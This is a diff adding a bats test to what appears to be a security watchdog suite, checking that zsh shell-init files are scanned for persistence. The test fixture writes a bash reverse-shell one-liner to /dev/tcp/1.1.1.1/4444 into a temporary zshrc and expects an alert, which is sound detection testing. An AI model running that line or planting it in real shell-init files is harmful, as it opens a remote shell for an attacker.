@@ -246,3 +246,16 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (zsh family axis: /etc/zsh/zshrc + /etc/zsh/zprofile — zsh shell-init also scanned)" {
+    # Sister axis to bash family scan. zsh-specific shell-init
+    # files are equally per-login exec surfaces.
+    ZSHRC="${TMP}/zshrc"
+    ZPROFILE="${TMP}/zprofile"
+    seed_benign
+    FILES_V="${PROFILE_F} ${ZSHRC} ${ZPROFILE}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# /etc/zsh/zshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${ZSHRC}"
+    FILES_V="${PROFILE_F} ${ZSHRC} ${ZPROFILE}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
